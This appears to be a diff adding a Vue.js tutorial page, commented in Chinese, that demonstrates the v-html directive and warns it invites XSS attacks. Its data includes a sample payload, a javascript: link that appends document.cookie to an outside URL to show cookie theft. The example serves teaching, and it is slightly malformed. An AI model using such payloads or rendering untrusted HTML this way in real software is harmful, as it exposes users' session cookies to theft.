@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Title</title>
+  <script src="../js/vue.js"></script>
+</head>
+<body>
+  <div id="root">
+    <!--
+      v-html：替换文本内容，但是他可以识别文本内的html标签
+      
+      注意： 使用v-html有安全性问题：容易产生xss攻击
+    -->
+    
+    <div> {{ name }}</div>
+    <div v-text="name"></div>
+    <div v-html="str"></div>
+    
+    <div v-html="str2"></div>
+    
+  </div>
+  
+  <script>
+    Vue.config.productionTip = false
+    
+    new Vue({
+      el: '#root',
+      data: {
+        name: 'xm',
+        str: '<h3> hello </h3>',
+        // cookie中 only http 的项只允许在http中使用
+        str2: '<a href=javascript:location:href="www.baidu.com?" + document.cookie> lll </a>'
+      }
+    })
+  </script>
+</body>
+</html>
